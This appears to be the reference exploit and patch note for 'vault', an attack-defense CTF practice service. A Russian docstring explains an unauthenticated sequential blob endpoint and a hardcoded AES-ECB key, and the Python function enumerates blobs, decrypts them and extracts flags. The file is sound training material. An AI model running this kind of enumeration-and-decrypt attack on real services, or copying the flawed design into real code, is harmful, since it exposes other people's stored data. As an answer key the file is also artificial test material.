"""ЭТАЛОН: vault — слабая криптография + утечка шифротекста.

Уязвимости:
  1) GET /blob/<id> отдаёт шифротекст БЕЗ авторизации (id последовательные);
  2) AES-ECB с фиксированным ключом, который лежит в исходниках образа —
     а образ у всех команд одинаковый, значит ключ известен всем.
Итог: качаем чужие blob'ы и расшифровываем своим же ключом.

Патч (services/vault/app.py): закрыть /blob авторизацией/владельцем ИЛИ убрать его;
плюс можно сменить ключ на случайный при старте (os.urandom(16)) — SLA (seal->reveal
в рамках одного процесса) не пострадает, а чужой сплойт с фикс-ключом перестанет читать.
Лучше — и то, и другое.
"""
import re
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

SERVICE = "vault"
FLAG = re.compile(r"[A-Z0-9]{31}=")
KEY = b"dojo-fixed-key!!"   # тот самый ключ из services/vault/app.py


def exploit(host, port, max_id=400):
    base = f"http://{host}:{port}"
    flags = []
    for i in range(1, max_id + 1):
        try:
            r = requests.get(f"{base}/blob/{i}", timeout=2)
        except requests.RequestException:
            break
        if r.status_code != 200:
            continue
        try:
            ct = bytes.fromhex(r.json()["ciphertext"])
            pt = unpad(AES.new(KEY, AES.MODE_ECB).decrypt(ct), 16)
        except Exception:
            continue
        flags += FLAG.findall(pt.decode(errors="ignore"))
    return flags
